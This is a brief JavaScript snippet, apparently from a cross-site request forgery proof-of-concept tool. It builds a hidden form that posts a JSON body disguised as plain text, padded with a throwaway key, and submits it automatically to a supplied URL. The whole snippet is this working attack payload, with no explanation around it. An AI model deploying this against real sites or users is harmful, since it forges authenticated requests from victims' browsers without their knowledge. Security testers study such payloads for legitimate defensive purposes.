// console.log(decodeURIComponent(post_data));
var fields = JSON.parse(decodeURIComponent(post_data));
var form = document.createElement("form");
form.setAttribute("method", "post");
form.setAttribute("action", decodeURIComponent(url));
form.setAttribute("enctype","text/plain");
fields = fields.slice(0,-1);
fields = fields.concat(",\"nh9unik8f9d\":\"");
var input = document.createElement("textarea");
input.setAttribute("name", fields);
input.textContent = "\"}";
// alert(f.name);
form.appendChild(input);
document.body.appendChild(form);
form.submit();